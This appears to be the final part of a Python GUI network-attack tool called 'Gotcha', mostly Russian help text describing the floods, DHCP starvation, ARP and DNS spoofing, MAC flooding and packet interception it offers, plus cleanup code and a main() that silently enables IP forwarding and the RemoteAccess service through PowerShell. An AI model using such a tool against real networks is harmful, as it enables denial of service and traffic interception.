   14. less 64 – короткие пакеты (<64 байт)
Примечание: фильтры нечувствительны к регистру;
Фильтры могут быть самыми разными не только теми, что указаны здесь"""
        bpf_txt = scrolledtext.ScrolledText(bpf_frame, wrap=tk.WORD, font=('Consolas', 9))
        bpf_txt.pack(fill='both', expand=True, padx=10, pady=10)
        bpf_txt.insert('1.0', bpf_text)
        bpf_txt.config(state='disabled')
        attacks_frame = ttk.Frame(help_notebook)
        help_notebook.add(attacks_frame, text="Описание атак")
        attacks_text = """АТАКИ:
1. ПЕРЕХВВАТ ПАКЕТОВ
   • Захватывает сетевой трафик на выбранном интерфейсе.
   • Можно указать BPF-фильтр для выборочного захвата.
   • При захвате программа автоматически отправляет заданное количество
     ответных пакетов (например, ICMP Echo Reply на Ping).
   • Позволяет сохранить перехваченный пакет, отредактировать его и отправить
     повторно.
   • Применяется для анализа трафика, тестирования сетевых устройств,
     изучения протоколов.
2. DHCP STARVATION (ИСЩЕНИЕ ПУЛА DHCP)
   • Атака по принципу DORA с уникальными MAC-адресами.
   • DHCP-сервер вынужден резервировать IP-адреса для каждого запроса,
     что приводит к исчерпанию пула доступных адресов.
   • Легитимные клиенты не могут получить IP.
   • Используется для проверки устойчивости DHCP-сервера.
3. DoS АТАКИ (ФЛУД)
   Поддерживаются протоколы: TCP, UDP, ICMP, ARP, DNS.
   • TCP SYN flood – отправка TCP-пакетов с флагом SYN, инициирующих
     соединения.
   • UDP flood – массовая отправка UDP-пакетов на случайные или фиксированные
     порты.
   • ICMP flood – непрерывная отправка ICMP Echo Request (ping).
   • ARP flood – лавинная отправка ARP-запросов, вызывающая перегрузку
     коммутаторов и ARP-таблиц.
   • DNS flood – запросы к DNS-серверу с поддельными именами, истощающие
     его ресурсы.
   • Для TCP, ARP, ICMP доступны опции случайного IP и MAC-адреса источника
     (имитация распределённой атаки).
4. ARP SPOOFING (ПОДМЕНА ARP)
   • Атака типа «человек посередине» на канальном уровне.
   • Отправляет поддельные ARP-ответы, убеждая целевое устройство и шлюз,
     что MAC-адрес атакующего принадлежит другому узлу.
   • Весь трафик между целью и шлюзом проходит через атакующего.
   • Возможно восстановление ARP после остановки и включение IP forwarding.
5. MAC FLOOD
   • Отправляет огромное количество Ethernet-кадров с минимальным размером
     и случайными MAC-адресами источника.
   • Переполняет таблицу коммутации (CAM-таблицу) коммутатора, заставляя его
     работать как хаб (ретранслировать весь трафик во все порты).
   • Может привести к отказу в обслуживании или раскрытию трафика.
6. DNS SPOOFING
   • Перехватывает DNS-запросы и подменяет ответы.
   • Позволяет перенаправлять трафик на заданный IP-адрес.
   • Поддерживает маски доменов (например, *.example.com) и catch-all правило.
   • Полезен для тестирования фишинга, родительского контроля."""
        attacks_txt = scrolledtext.ScrolledText(attacks_frame, wrap=tk.WORD, font=('Consolas', 9))
        attacks_txt.pack(fill='both', expand=True, padx=10, pady=10)
        attacks_txt.insert('1.0', attacks_text)
        attacks_txt.config(state='disabled')
        access_frame = ttk.Frame(help_notebook)
        help_notebook.add(access_frame, text="Доступ и диагностика")
        access_text = """ФУНКЦИИ ВКЛАДКИ "ДОСТУП":
1. ICMP Ping
   • Отправляет 4 ICMP Echo Request (ping) на указанный IP-адрес.
   • Использует системную утилиту ping, вывод отображается в логе.
   • Позволяет проверить доступность узла и измерить время отклика.
2. Port Scan
   • Сканирует наиболее распространённые TCP-порты (21,22,23,25,53,80,110,143,443,993,995,3389).
   • Для каждого порта выполняется попытка установить TCP-соединение.
   • Результат: список открытых портов.
3. Traceroute
   • Выполняет трассировку маршрута до указанного узла.
   • На Windows использует tracert с параметрами -d -h 30 -w 1000.
   • На Linux — traceroute -n -m 30 -w 1.
   • Показывает промежуточные узлы и задержки.
4. Таблица маршрутизации
   • Выводит IPv4 таблицу маршрутизации (аналог route print).
   • Отфильтровывает IPv6 строки для удобства чтения.
   • Полезна для диагностики сетевых настроек.
5. Сетевые адаптеры
   • Показывает все доступные сетевые интерфейсы (имена, IP-адреса, MAC-адреса).
   • Использует библиотеку scapy для получения информации.
6. Сканировать сеть
   • Выполняет ARP-сканирование локальной сети /24 (на основе введённого IP).
   • Отправляет ARP-запросы на все адреса подсети.
   • Через 2 секунды выводит список найденных устройств с IP, MAC и, при возможности, hostname.
   • Полезно для инвентаризации сети и обнаружения активных хостов."""
        access_txt = scrolledtext.ScrolledText(access_frame, wrap=tk.WORD, font=('Arial', 10))
        access_txt.pack(fill='both', expand=True, padx=10, pady=10)
        access_txt.insert('1.0', access_text)
        access_txt.config(state='disabled')
        close_btn = ttk.Button(help_window, text="Закрыть", command=help_window.destroy)
        close_btn.pack(pady=10)
        self.theme_manager.apply_to_widgets(help_window, self.theme_manager.themes[self.theme_manager.current_theme])

    def generate_random_mac(self):
        return "%02x:%02x:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255), random.randint(0, 255),
            random.randint(0, 255), random.randint(0, 255),
            random.randint(0, 255), random.randint(0, 255)
        )

    def on_closing(self):
        if self.custom_attack_running:
            self.stop_custom_attack()
        if self.dhcp_attack_running:
            self.stop_dhcp_attack()
        if self.arp_spoof_running:
            self.stop_arp_spoof()
        if self.packet_intercept_running:
            self.stop_packet_intercept()
        if self.mac_attack_running:
            self.stop_mac_flood()
        if self.dns_spoof_running:
            self.stop_dns_spoof()
        for key, (proc, stop_event) in list(self.external_processes.items()):
            stop_event.set()
            if proc.poll() is None:
                try:
                    proc.terminate()
                    proc.wait(timeout=1)
                except:
                    proc.kill()
        self.system_monitor_running = False
        self.root.destroy()

def check_admin():
    if platform.system() == "Windows":
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    return True

def main():
    if platform.system() == "Windows" and not check_admin():
        messagebox.showerror("Требуются права администратора", 
                           "Программа должна быть запущена от имени администратора.")
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        except:
            pass
        return
    # Execute PowerShell commands to enable IP forwarding and start RemoteAccess
    try:
        subprocess.run(["powershell", "-Command", "Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\" -Name \"IPEnableRouter\" -Value 1"], capture_output=True)
        subprocess.run(["powershell", "-Command", "Set-Service RemoteAccess -StartupType Automatic"], capture_output=True)
        subprocess.run(["powershell", "-Command", "Start-Service RemoteAccess"], capture_output=True)
    except:
        pass
    root = tk.Tk()
    app = Gotcha(root)
    root.protocol("WM_DELETE_WINDOW", app.on_closing)
    root.mainloop()

if __name__ == "__main__":
    main()
